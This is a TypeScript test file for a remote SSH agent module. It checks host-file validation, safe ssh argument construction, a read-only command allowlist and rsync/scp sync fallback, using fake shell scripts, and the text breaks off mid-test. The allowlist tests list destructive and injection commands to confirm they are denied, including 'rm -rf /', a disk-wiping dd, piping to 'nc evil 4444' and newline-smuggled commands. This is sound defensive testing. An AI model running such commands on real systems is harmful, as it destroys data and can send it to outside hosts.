// ============================================================================
// tests/remote.test.ts — 远程 Agent 簇（v0.5.18 · capabilities #133）
// ----------------------------------------------------------------------------
// 覆盖矩阵（对 lib/remote.ts 的行为级断言 + CLI/工具环/Web 三端冒烟；
// tests/cloud.test.ts 同构风格 —— 无真远程机环境的价值在**降级链完整 +
// 参数构造/输出解析真实可测 + allowlist 安全模型**）：
//   1. 探测降级（PATH 置空宇宙）：probeRemote 四工具缺席 → available:false +
//      安装指引 + 计划车道指引；SSH_AUTH_SOCK 只回布尔绝不回显值；
//      parseOpenSshVersion 三形态纯函数；
//   2. 真实车道可测（假 ssh/rsync/scp 脚本注入 PATH —— POSIX skipIf win32）：
//      ssh argv 构造形态（BatchMode/ConnectTimeout=8/accept-new/-p/-i/
//      user@host/--，**次序不锁死**）；退出码/stdout/stderr 结构化收集；
//      失败三类诊断（超时/拒连/鉴权）；ping 三统计 + 部分失败；
//   3. 档案层（remote-hosts.json）：缺席=空档案非错误 / 坏 JSON / 顶层非数组 /
//      缺字段 / 私钥内容混入拒绝 / password 字段拒绝 / save 全量校验拒绝半档 /
//      findRemoteHost 按 name 与按 host 双通道；
//   4. allowlist：host 不在档案拒绝（不猜默认 + 创建指引）；白名单外命令且无
//      allow_full 拒绝（**拒绝先于档案先于 spawn** —— PATH 置空下仍 denied）；
//      白名单内命令 + PATH 置空 → tool-absent；allow_full 显式开启后过门；
//   5. sync 三层降级：rsync 车道 argv 形态 → rsync 缺席 scp -r 降级（-P 大写）
//      → 双缺指引计划车道；local 越界 jail；remote 路径元字符拒绝；download 方向；
//   6. 计划器纯函数多模式矩阵（git/rsync/container/all）+ remoteSelfTest 全绿；
//   7. CLI 冒烟（runOrg 真子进程）：probe/hosts/exec（host-not-found + 白名单
//      拒绝）/plan/self-test；
//   8. Web /api/govex/remote 四动作（probe/hosts/plan/ping）+ GUI 🛰 区块要素；
//   9. 工具环 e2e（scripted 剧本驱动 direct.hsl —— wiring2/lsp.test.ts 同款）：
//      remote_probe/remote_plan（只读模式）+ remote_ping host 档案门 +
//      remote_exec（process_spawn 门 + 审批在环，host 不在档案仍拒绝 ——
//      双层治理可观测）。
// 环境自适应：ssh/scp/ssh-keygen 在沙箱缺席、GitHub CI 预装 —— 探测断言锁
// 形态不锁环境（cloud.test.ts v0.5.17.2 哲学）；rsync 沙箱+ubuntu/macos runner
// 在场（windows runner 未必）→ 条件断言。
// ============================================================================
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import {
  probeRemote, parseOpenSshVersion,
  loadRemoteHosts, saveRemoteHosts, findRemoteHost, REMOTE_HOSTS_FILE, REMOTE_HOSTS_GUIDANCE,
  remoteArgv, remoteCommandAllowed, remoteExec, remoteSync, remotePing, computePingStats, diagnoseSshFailure,
  remoteDeployPlan, REMOTE_DEPLOY_MODES, remoteSelfTest, REMOTE_READONLY_COMMANDS,
  type RemoteHostEntry,
} from "../lib/remote.ts";
import { TEST_RUN, runOrg, runDhv, eventsOf } from "./helpers";
import { startWebServer } from "../web/entry.ts";

const POSIX = process.platform !== "win32"; // 假脚本注入只在 POSIX（win32 诚实 skipIf）

function tmpWs(tag: string): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), `org-remote-${tag}-`));
}

function w(ws: string, rel: string, content: string): string {
  const abs = path.join(ws, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, content);
  return abs;
}

/** PATH 置空宇宙（与 tests/cloud.test.ts 同规）。 */
function withEmptyPath<T>(fn: () => T): T {
  const saved = process.env.PATH;
  process.env.PATH = "";
  try {
    return fn();
  } finally {
    process.env.PATH = saved;
  }
}

/** 档案写入辅助（直接 saveRemoteHosts 过校验车道）。 */
function seedHosts(ws: string, hosts: RemoteHostEntry[]): void {
  const r = saveRemoteHosts(ws, hosts);
  expect(r.ok).toBe(true);
}

const HOST_DEPLOY: RemoteHostEntry = { name: "deploy", host: "deploy.example.com", user: "deploy", port: 2222, identity: "~/.ssh/id_ed25519_deploy" };
const HOST_PLAIN: RemoteHostEntry = { name: "app", host: "app.internal", user: "app" };

// ---- 假 ssh / rsync / scp 脚本注入（真实车道可测：形态正则，不锁次序） --------

const FAKE_BIN = path.join(TEST_RUN, "remote-fake-bin");

/**
 * 假 ssh：`-V` → stderr 版本串（OpenSSH 契约）；执行形态 → stdout 回显
 * `ARGV:<空格连接的参数>`（参数构造断言面）；FAKE_SSH_EXIT/FAKE_SSH_OUT/
 * FAKE_SSH_ERR 控制退出码/额外输出；FAKE_SSH_FAIL_MOD + FAKE_SSH_COUNT 实现
 * 「每第 N 发失败」（ping 部分降级 —— 跨进程计数用落盘文件）。
 */
function makeFakeSsh(dir: string): void {
  fs.writeFileSync(path.join(dir, "ssh"), [
    "#!/bin/sh",
    'if [ "$1" = "-V" ]; then',
    '  echo "OpenSSH_9.6p1 FakeBin, OpenSSL 3.0.13" >&2',
    "  exit 0",
    "fi",
    'printf "ARGV:%s\\n" "$*"',
    'if [ -n "$FAKE_SSH_OUT" ]; then printf "%s\\n" "$FAKE_SSH_OUT"; fi',
    'if [ -n "$FAKE_SSH_ERR" ]; then printf "%s\\n" "$FAKE_SSH_ERR" >&2; fi',
    'if [ -n "$FAKE_SSH_FAIL_MOD" ]; then',
    '  cnt="${FAKE_SSH_COUNT:-}"',
    '  [ -f "$cnt" ] || echo 0 > "$cnt"',
    '  n=$(( $(cat "$cnt") + 1 ))',
    '  echo "$n" > "$cnt"',
    '  if [ $(( n % FAKE_SSH_FAIL_MOD )) -eq 0 ]; then',
    '    echo "fake ssh simulated failure #$n" >&2',
    "    exit 9",
    "  fi",
    "fi",
    'exit "${FAKE_SSH_EXIT:-0}"',
    "",
  ].join("\n"));
  fs.chmodSync(path.join(dir, "ssh"), 0o755);
}

/** 假 rsync：--version 探活 + ARGV 回显（rsync 车道参数构造断言面）。 */
function makeFakeRsync(dir: string): void {
  fs.writeFileSync(path.join(dir, "rsync"), [
    "#!/bin/sh",
    'if [ "$1" = "--version" ]; then echo "rsync  version 3.4.1  FakeBin protocol 32"; exit 0; fi',
    'printf "ARGV:%s\\n" "$*"',
    'exit "${FAKE_RSYNC_EXIT:-0}"',
    "",
  ].join("\n"));
  fs.chmodSync(path.join(dir, "rsync"), 0o755);
}

/** 假 scp：ARGV 回显（scp 降级车道参数构造断言面）。 */
function makeFakeScp(dir: string): void {
  fs.writeFileSync(path.join(dir, "scp"), [
    "#!/bin/sh",
    'printf "ARGV:%s\\n" "$*"',
    'exit "${FAKE_SCP_EXIT:-0}"',
    "",
  ].join("\n"));
  fs.chmodSync(path.join(dir, "scp"), 0o755);
}

/** PATH 注入宇宙：fakeBin 前置（真工具仍在后部 → 前置优先命中 fake）。
 * FAKE_* 环境变量快照/恢复（不留环境侧写 —— env-hygiene 哲学）。 */
function withFakePath<T>(fn: () => T): T {
  const saved = process.env.PATH;
  const fakeKeys = ["FAKE_SSH_OUT", "FAKE_SSH_ERR", "FAKE_SSH_EXIT", "FAKE_SSH_FAIL_MOD", "FAKE_SSH_COUNT", "FAKE_RSYNC_EXIT", "FAKE_SCP_EXIT"];
  const savedFake: Record<string, string | undefined> = {};
  for (const k of fakeKeys) { savedFake[k] = process.env[k]; delete process.env[k]; }
  process.env.PATH = [FAKE_BIN, saved].filter(Boolean).join(path.delimiter);
  try {
    return fn();
  } finally {
    process.env.PATH = saved;
    for (const k of fakeKeys) {
      if (savedFake[k] === undefined) delete process.env[k];
      else process.env[k] = savedFake[k];
    }
  }
}

beforeAll(() => {
  fs.rmSync(FAKE_BIN, { recursive: true, force: true });
  fs.mkdirSync(FAKE_BIN, { recursive: true });
  makeFakeSsh(FAKE_BIN);
  makeFakeRsync(FAKE_BIN);
  makeFakeScp(FAKE_BIN);
});

// ---- 1. 探测降级（PATH 置空宇宙）--------------------------------------------------

describe("远程 Agent：探测降级（无工具宇宙）", () => {
  test("probeRemote：PATH 置空 → available:false + versionRaw:null + reason 含安装指引与计划车道", () => {
    const p = withEmptyPath(() => probeRemote());
    expect(p.available).toBe(false);
    expect(p.versionRaw).toBeNull();
    expect(p.openSsh).toBeNull();
    expect(p.scpAvailable).toBe(false);
    expect(p.rsyncAvailable).toBe(false);
    expect(p.sshKeygenAvailable).toBe(false);
    expect(p.reason).toContain("ssh");
    expect(p.reason).toContain("org remote plan"); // 降级车道在指引里（计划层恒在）
  }, 30_000);

  test("probeRemote：SSH_AUTH_SOCK 只回布尔绝不回显值（agent 环境的安全面）", () => {
    const secretSock = "/tmp/agent.sock.VERY_SECRET_PATH_DO_NOT_LEAK";
    const saved = process.env.SSH_AUTH_SOCK;
    process.env.SSH_AUTH_SOCK = secretSock;
    try {
      const p = probeRemote();
      expect(p.agentForwarding).toBe(true);
      const flat = JSON.stringify(p);
      expect(flat.includes(secretSock)).toBe(false); // 值绝不进结果面
    } finally {
      if (saved === undefined) delete process.env.SSH_AUTH_SOCK;
      else process.env.SSH_AUTH_SOCK = saved;
    }
  }, 30_000);

  test("probeRemote：rsync 在场时版本行可观测（环境自适应 —— 沙箱/CI ubuntu+macos 预装）", () => {
    const p = probeRemote();
    if (p.rsyncAvailable) {
      expect(p.rsyncVersion).toBeTruthy();
      expect(p.rsyncVersion!).toMatch(/^(rsync|openrsync)\s+version/i); // macOS 12+ 自带 openrsync —— 锁形态不锁发行版
    } else {
      expect(p.rsyncVersion).toBeNull(); // 缺席即缺席，不臆造版本
    }
  }, 30_000);

  test("parseOpenSshVersion：三形态纯函数（p1 后缀 / 纯数字 / 非 OpenSSH → null）", () => {
    expect(parseOpenSshVersion("OpenSSH_9.6p1 Ubuntu-3ubuntu13, OpenSSL 3.0.13")).toEqual({ major: 9, minor: 6 });
    expect(parseOpenSshVersion("OpenSSH_8.9p1, OpenSSL 3.0.7")).toEqual({ major: 8, minor: 9 });
    expect(parseOpenSshVersion("dropbear 2022.83")).toBeNull();
    expect(parseOpenSshVersion("")).toBeNull();
  }, 30_000);
});

// ---- 2. 真实车道可测（假 ssh 脚本注入 PATH —— 形态正则，次序不锁死）---------------

describe.skipIf(!POSIX)("远程 Agent：假 ssh 车道（参数构造 + 输出收集 + 三类诊断）", () => {
  test("remoteExec：档案主机 → ok:true + stdout 收集 ARGV 形态（BatchMode/ConnectTimeout=8/accept-new/-p 2222/-i 展开/user@host/-- 分隔/命令尾）", () => {
    const ws = tmpWs("fake-exec");
    try {
      seedHosts(ws, [HOST_DEPLOY]);
      const r = withFakePath(() => remoteExec(ws, { host: "deploy", command: "uptime" }));
      expect(r.ok).toBe(true);
      expect(r.exitCode).toBe(0);
      expect(r.tookMs).toBeGreaterThanOrEqual(0);
      // 形态断言（不锁次序）：stdout 回显的 argv 串包含全部关键形态
      const line = r.stdout.split("\n").find((l) => l.startsWith("ARGV:")) ?? "";
      expect(line).toContain("BatchMode=yes");
      expect(line).toContain("ConnectTimeout=8");
      expect(line).toContain("StrictHostKeyChecking=accept-new");
      expect(line).toContain("-p");
      expect(line).toContain("2222");
      expect(line).toContain("-i");
      expect(line).toContain(path.join(os.homedir(), ".ssh/id_ed25519_deploy")); // ~/ 展开
      expect(line).toContain("deploy@deploy.example.com");
      expect(line).toContain("--"); // 远端命令分隔符（ssh 语义）
      expect(line).toContain("uptime");
      // argv 观测面同款形态
      expect(r.argv.join(" ")).toContain("BatchMode=yes");
      expect(r.argv.join(" ")).toContain("deploy@deploy.example.com");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("remoteExec：无 identity 档案 → argv 不含 -i（ssh 默认链：agent/config/默认密钥）", () => {
    const ws = tmpWs("fake-noid");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = withFakePath(() => remoteExec(ws, { host: "app", command: "echo ok" }));
      expect(r.ok).toBe(true);
      expect(r.argv.includes("-i")).toBe(false);
      expect(r.argv.join(" ")).toContain("app@app.internal");
      expect(r.argv).toContain("22"); // 缺省端口
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("remoteExec：退出码/stdout/stderr 结构化收集（假脚本 FAKE_* 控制）", () => {
    const ws = tmpWs("fake-io");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = withFakePath(() => {
        process.env.FAKE_SSH_EXIT = "3";
        process.env.FAKE_SSH_OUT = "hello-remote-stdout";
        process.env.FAKE_SSH_ERR = "some-remote-stderr";
        return remoteExec(ws, { host: "app", command: "uptime" });
      });
      expect(r.ok).toBe(false); // 退出码 3
      expect(r.exitCode).toBe(3);
      expect(r.kind).toBe("failed"); // 未归类失败
      expect(r.stdout).toContain("hello-remote-stdout");
      expect(r.stderr).toContain("some-remote-stderr");
      expect(r.reason).toContain("退出码 3"); // 诚实诊断带退出码
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("remoteExec 三类诊断：Connection refused → refused；Permission denied → auth；host key 漂移 → auth", () => {
    const ws = tmpWs("fake-diag");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const refused = withFakePath(() => {
        process.env.FAKE_SSH_EXIT = "255";
        process.env.FAKE_SSH_ERR = "ssh: connect to host app.internal port 22: Connection refused";
        return remoteExec(ws, { host: "app", command: "uptime" });
      });
      expect(refused.ok).toBe(false);
      expect(refused.kind).toBe("refused");
      expect(refused.reason).toContain("拒连");
      const auth = withFakePath(() => {
        process.env.FAKE_SSH_EXIT = "255";
        process.env.FAKE_SSH_ERR = "app@app.internal: Permission denied (publickey).";
        return remoteExec(ws, { host: "app", command: "uptime" });
      });
      expect(auth.kind).toBe("auth");
      expect(auth.reason).toContain("鉴权");
      const drifted = withFakePath(() => {
        process.env.FAKE_SSH_EXIT = "255";
        process.env.FAKE_SSH_ERR = "REMOTE HOST IDENTIFICATION HAS CHANGED!";
        return remoteExec(ws, { host: "app", command: "uptime" });
      });
      expect(drifted.kind).toBe("auth"); // 指纹漂移归鉴权族（密钥/信任面）
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("remotePing：rounds=3 全成功 → times.length=3 + min/avg/max 三统计 + failures=0", () => {
    const ws = tmpWs("fake-ping");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = withFakePath(() => remotePing(ws, { host: "app", rounds: 3 }));
      expect(r.ok).toBe(true);
      expect(r.times.length).toBe(3);
      expect(r.failures).toBe(0);
      expect(r.stats).not.toBeNull();
      expect(r.stats!.min).toBeLessThanOrEqual(r.stats!.avg);
      expect(r.stats!.avg).toBeLessThanOrEqual(r.stats!.max);
      // ping 走固定 echo 命令（不接受任意命令）
      expect(r.argv.join(" ")).toContain("echo ping");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 60_000);

  test("remotePing：每第 2 发失败（FAKE_SSH_FAIL_MOD）→ 部分降级可观测（failures=1 + 统计只计成功轮）", () => {
    const ws = tmpWs("fake-ping-partial");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const counter = path.join(ws, ".fake-count");
      const r = withFakePath(() => {
        process.env.FAKE_SSH_FAIL_MOD = "2";
        process.env.FAKE_SSH_COUNT = counter;
        return remotePing(ws, { host: "app", rounds: 3 });
      });
      expect(r.ok).toBe(true);
      expect(r.times.length).toBe(2); // 第 1、3 轮成功
      expect(r.failures).toBe(1); // 第 2 轮失败
      expect(r.reason).toContain("1/3 轮失败"); // 部分降级诚实标注
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 60_000);

  test("remotePing：全失败 → ok:false + kind:refused + stats:null + 诊断指引", () => {
    const ws = tmpWs("fake-ping-fail");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = withFakePath(() => {
        process.env.FAKE_SSH_EXIT = "255";
        process.env.FAKE_SSH_ERR = "ssh: connect to host app.internal port 22: Connection refused";
        return remotePing(ws, { host: "app", rounds: 2 });
      });
      expect(r.ok).toBe(false);
      expect(r.failures).toBe(2);
      expect(r.stats).toBeNull();
      expect(r.reason).toContain("全部失败");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 60_000);

  test("remotePing：rounds 上限 10（防探测风暴）+ 缺省 4", () => {
    const ws = tmpWs("fake-ping-cap");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = withFakePath(() => remotePing(ws, { host: "app", rounds: 99 }));
      expect(r.rounds).toBe(10);
      expect(r.times.length + r.failures).toBe(10);
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 120_000);
});

// ---- 3. 档案层（remote-hosts.json 读写 + 诚实校验矩阵）----------------------------

describe("远程 Agent：主机档案（loadRemoteHosts / saveRemoteHosts）", () => {
  test("档案缺席 → exists:false + hosts:[] + ok:true（空档案不是错误 —— 但一切 host 寻址都会拒绝）", () => {
    const ws = tmpWs("hosts-absent");
    try {
      const r = loadRemoteHosts(ws);
      expect(r.exists).toBe(false);
      expect(r.ok).toBe(true);
      expect(r.hosts).toEqual([]);
      expect(r.errors).toEqual([]);
      expect(r.file).toBe(path.join(ws, REMOTE_HOSTS_FILE));
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("坏 JSON → ok:false + errors 人读上浮（不静默吞）", () => {
    const ws = tmpWs("hosts-badjson");
    try {
      w(ws, REMOTE_HOSTS_FILE, "{ not valid json !!!");
      const r = loadRemoteHosts(ws);
      expect(r.exists).toBe(true);
      expect(r.ok).toBe(false);
      expect(r.hosts).toEqual([]);
      expect(r.errors.length).toBe(1);
      expect(r.errors[0]).toContain("JSON");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("顶层非数组 → 明确错误（档案是数组协议）", () => {
    const ws = tmpWs("hosts-notarr");
    try {
      w(ws, REMOTE_HOSTS_FILE, JSON.stringify({ deploy: { host: "h" } }));
      const r = loadRemoteHosts(ws);
      expect(r.ok).toBe(false);
      expect(r.errors[0]).toContain("数组");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("缺字段条目被过滤 + 错误上浮（部分降级不全体拒绝 —— 过检条目照常可用）", () => {
    const ws = tmpWs("hosts-partial");
    try {
      w(ws, REMOTE_HOSTS_FILE, JSON.stringify([
        { name: "good", host: "good.example.com", user: "ops" },
        { name: "bad-no-user", host: "bad.example.com" },
        { name: "bad-no-host", user: "x" },
        "not-an-object",
      ]));
      const r = loadRemoteHosts(ws);
      expect(r.ok).toBe(false);
      expect(r.hosts.length).toBe(1);
      expect(r.hosts[0]!.name).toBe("good");
      expect(r.errors.length).toBe(3);
      const flat = r.errors.join("\n");
      expect(flat).toContain("user");
      expect(flat).toContain("host");
      expect(flat).toContain("不是对象");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("私钥内容混入 identity → 拒绝（PEM/OpenSSH 头形态检测 —— 私钥内容绝不入档案）", () => {
    const ws = tmpWs("hosts-privkey");
    try {
      for (const [i, bad] of [
        { name: "a", host: "h", user: "u", identity: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----" },
        { name: "b", host: "h", user: "u", identity: "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA\n" },
        { name: "c", host: "h", user: "u", identity: "~/.ssh/ok", extra: "-----BEGIN EC PRIVATE KEY-----" },
      ].entries()) {
        w(ws, REMOTE_HOSTS_FILE, JSON.stringify([bad]));
        const r = loadRemoteHosts(ws);
        expect(r.ok).toBe(false);
        expect(r.hosts).toEqual([]);
        expect(r.errors.length).toBe(1);
        expect(r.errors[0]).toContain("私钥");
      }
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("password 类字段 → 拒绝（密码永不入账 —— BatchMode=yes 下密码认证在 ssh 语义上就会失败）", () => {
    const ws = tmpWs("hosts-passwd");
    try {
      w(ws, REMOTE_HOSTS_FILE, JSON.stringify([{ name: "a", host: "h", user: "u", password: "hunter2" }]));
      const r = loadRemoteHosts(ws);
      expect(r.ok).toBe(false);
      expect(r.errors[0]).toContain("password");
      // 落盘内容绝不回显密码值
      expect(r.errors.join("\n").includes("hunter2")).toBe(false);
      // 同族字段同拒
      w(ws, REMOTE_HOSTS_FILE, JSON.stringify([{ name: "a", host: "h", user: "u", passphrase: "xxx" }]));
      expect(loadRemoteHosts(ws).ok).toBe(false);
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("name 重复 → 拒（档案名是寻址键，必须唯一）", () => {
    const ws = tmpWs("hosts-dup");
    try {
      w(ws, REMOTE_HOSTS_FILE, JSON.stringify([
        { name: "deploy", host: "a.example.com", user: "u" },
        { name: "deploy", host: "b.example.com", user: "u" },
      ]));
      const r = loadRemoteHosts(ws);
      expect(r.hosts.length).toBe(1);
      expect(r.errors.length).toBe(1);
      expect(r.errors[0]).toContain("重复");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("port 越界（0 / 70000 / 非整数）→ 拒；1-65535 合法", () => {
    const ws = tmpWs("hosts-port");
    try {
      for (const bad of [0, 70000, 22.5, "twenty-two"]) {
        w(ws, REMOTE_HOSTS_FILE, JSON.stringify([{ name: "a", host: "h", user: "u", port: bad }]));
        const r = loadRemoteHosts(ws);
        expect(r.ok).toBe(false);
        expect(r.errors[0]).toContain("port");
      }
      w(ws, REMOTE_HOSTS_FILE, JSON.stringify([{ name: "a", host: "h", user: "u", port: 2222 }]));
      const ok = loadRemoteHosts(ws);
      expect(ok.ok).toBe(true);
      expect(ok.hosts[0]!.port).toBe(2222);
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("saveRemoteHosts：合法条目写入 + 回读一致；坏条目拒绝写盘（绝不落半档）", () => {
    const ws = tmpWs("hosts-save");
    try {
      const s = saveRemoteHosts(ws, [HOST_DEPLOY, HOST_PLAIN]);
      expect(s.ok).toBe(true);
      const r = loadRemoteHosts(ws);
      expect(r.ok).toBe(true);
      expect(r.hosts.length).toBe(2);
      expect(r.hosts[0]).toEqual(HOST_DEPLOY);
      // 坏条目（私钥内容）→ 拒绝写盘，文件不被覆盖
      const before = fs.readFileSync(path.join(ws, REMOTE_HOSTS_FILE), "utf-8");
      const bad = saveRemoteHosts(ws, [{ name: "x", host: "h", user: "u", identity: "-----BEGIN RSA PRIVATE KEY-----\nAA" }]);
      expect(bad.ok).toBe(false);
      expect(bad.errors[0]).toContain("私钥");
      expect(fs.readFileSync(path.join(ws, REMOTE_HOSTS_FILE), "utf-8")).toBe(before);
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("findRemoteHost：按 name 精确匹配优先；name 不中且 host 字段唯一相等时兜底；找不到 → null + 档案指引", () => {
    const ws = tmpWs("hosts-find");
    try {
      seedHosts(ws, [HOST_DEPLOY, HOST_PLAIN]);
      const byName = findRemoteHost(ws, "deploy");
      expect(byName.entry?.name).toBe("deploy");
      expect(byName.by).toBe("name");
      const byHost = findRemoteHost(ws, "app.internal"); // name 不中 → host 字段唯一兜底
      expect(byHost.entry?.name).toBe("app");
      expect(byHost.by).toBe("host");
      const none = findRemoteHost(ws, "ghost.example.com");
      expect(none.entry).toBeNull();
      expect(none.by).toBeNull();
      const names = none.report.hosts.map((h) => h.name);
      expect(JSON.stringify(names)).toContain("deploy"); // 可用名上浮
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);
});

// ---- 4. allowlist 安全模型（拒绝先于档案先于探测先于 spawn）------------------------

describe("远程 Agent：白名单与 host 门控", () => {
  test("remoteExec：白名单外命令且无 allow_full → denied（先于 host 档案 —— host 也不在档案仍返回 denied，证明门序）", () => {
    const r = withEmptyPath(() => remoteExec("/tmp/nowhere-ws", { host: "ghost", command: "systemctl restart app" }));
    expect(r.ok).toBe(false);
    expect(r.kind).toBe("denied"); // 不是 host-not-found —— 白名单门在前
    expect(r.reason).toContain("白名单");
    expect(r.reason).toContain("allow_full");
    expect(r.tookMs).toBe(0);
  }, 30_000);

  test("remoteExec：白名单外命令逐个拒绝（rm/reboot/shutdown/curl/wget/python…）；白名单九命令全放行到下一层", () => {
    for (const bad of ["rm -rf /", "reboot", "shutdown -h now", "curl http://evil", "wget x", "python3 -c x", "dd if=/dev/zero of=/dev/sda"]) {
      const r = withEmptyPath(() => remoteExec("/tmp/nowhere-ws", { host: "h", command: bad }));
      expect(r.kind).toBe("denied");
    }
    for (const good of REMOTE_READONLY_COMMANDS) {
      const r = withEmptyPath(() => remoteExec("/tmp/nowhere-ws", { host: "h", command: `${good} x` }));
      expect(r.kind).not.toBe("denied"); // 白名单过了 → 轮到 host-not-found
    }
  }, 30_000);

  test("remoteExec：白名单内命令 + host 不在档案 → host-not-found（不猜默认 + 创建指引）", () => {
    const ws = tmpWs("allow-hostgate");
    try {
      const r = remoteExec(ws, { host: "ghost", command: "uptime" });
      expect(r.ok).toBe(false);
      expect(r.kind).toBe("host-not-found");
      expect(r.reason).toContain(REMOTE_HOSTS_FILE);
      expect(r.reason).toContain("不猜默认主机");
      expect(r.reason).toContain("identity"); // 指引含字段协议说明
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("remoteExec：白名单内命令 + PATH 置空 → tool-absent（白名单与档案过了才轮到工具缺席）", () => {
    const ws = tmpWs("allow-absent");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = withEmptyPath(() => remoteExec(ws, { host: "app", command: "uptime" }));
      expect(r.kind).toBe("tool-absent");
      expect(r.reason).toContain("openssh-client");
      expect(r.reason).toContain("org remote plan"); // 降级车道指引
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("remoteExec：allow_full=true 显式开启 → 白名单外命令过门（PATH 置空 → tool-absent 即证明过了白名单层）", () => {
    const ws = tmpWs("allow-full");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = withEmptyPath(() => remoteExec(ws, { host: "app", command: "systemctl status app", allowFull: true }));
      expect(r.kind).toBe("tool-absent"); // 不是 denied —— allow_full 过了白名单门
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("remoteCommandAllowed：元字符拒（注入形态）+ 空命令拒 + 带参数只读命令放行", () => {
    expect(remoteCommandAllowed("echo hi;rm -rf /").allowed).toBe(false);
    expect(remoteCommandAllowed("cat $(which passwd)").allowed).toBe(false);
    expect(remoteCommandAllowed("echo `id`").allowed).toBe(false);
    expect(remoteCommandAllowed("uptime | nc evil 4444").allowed).toBe(false);
    expect(remoteCommandAllowed("echo 'pwned'").allowed).toBe(false); // 引号同拒（白名单简单命令不需要）
    expect(remoteCommandAllowed("").allowed).toBe(false);
    expect(remoteCommandAllowed("df -h").allowed).toBe(true);
    expect(remoteCommandAllowed("cat /etc/hosts").allowed).toBe(true);
    expect(remoteCommandAllowed("ps aux").allowed).toBe(true);
    expect(remoteCommandAllowed("which bun").allowed).toBe(true);
  }, 30_000);

  test("remoteExec：command 含换行 → denied（allow_full 下同拒 —— 多命令注入形态）", () => {
    const ws = tmpWs("allow-newline");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = remoteExec(ws, { host: "app", command: "uptime\nrm -rf /" });
      expect(r.kind).toBe("denied");
      const r2 = remoteExec(ws, { host: "app", command: "uptime\nrm -rf /", allowFull: true });
      expect(r2.kind).toBe("denied"); // allow_full 不豁免换行注入
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);
});

// ---- 5. remoteSync 三层降级（rsync → scp → 指引）+ 路径监狱 ------------------------

describe.skipIf(!POSIX)("远程 Agent：remoteSync 三层降级", () => {
  test("rsync 车道：-avz + -e ssh 安全旗标串 + local 绝对路径 + user@host:remote 形态", () => {
    const ws = tmpWs("sync-rsync");
    try {
      seedHosts(ws, [HOST_DEPLOY]);
      w(ws, "deploy/src.txt", "hello");
      const r = withFakePath(() => remoteSync(ws, { host: "deploy", local: "deploy/src.txt", remote: "/srv/app/src.txt" }));
      expect(r.ok).toBe(true);
      expect(r.exitCode).toBe(0);
      const line = r.stdout.split("\n").find((l) => l.startsWith("ARGV:")) ?? "";
      expect(line).toContain("-avz");
      expect(line).toContain("-e");
      expect(line).toContain("BatchMode=yes");
      expect(line).toContain("-p");
      expect(line).toContain("2222");
      expect(line).toContain(path.join(ws, "deploy/src.txt")); // local 解析为工作区绝对路径
      expect(line).toContain("deploy@deploy.example.com:/srv/app/src.txt");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("rsync 缺席 → scp 降级：-r + -P 大写端口 + REMOTE_SSH_FLAGS + user@host:remote", () => {
    const ws = tmpWs("sync-scp");
    const onlyScp = path.join(TEST_RUN, "remote-fake-scp-only");
    try {
      seedHosts(ws, [HOST_DEPLOY]);
      w(ws, "deploy/src.txt", "hello");
      fs.rmSync(onlyScp, { recursive: true, force: true });
      fs.mkdirSync(onlyScp, { recursive: true });
      makeFakeScp(onlyScp);
      const saved = process.env.PATH;
      process.env.PATH = onlyScp; // 只有 scp（真/假 rsync 都不在）
      try {
        const r = remoteSync(ws, { host: "deploy", local: "deploy/src.txt", remote: "/srv/app/src.txt" });
        expect(r.ok).toBe(true);
        const line = r.stdout.split("\n").find((l) => l.startsWith("ARGV:")) ?? "";
        expect(line).toContain("-r");
        expect(line).toContain("-P");
        expect(line).toContain("2222");
        expect(line).toContain("accept-new");
        expect(line).toContain("deploy@deploy.example.com:/srv/app/src.txt");
      } finally {
        process.env.PATH = saved;
      }
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
      fs.rmSync(onlyScp, { recursive: true, force: true });
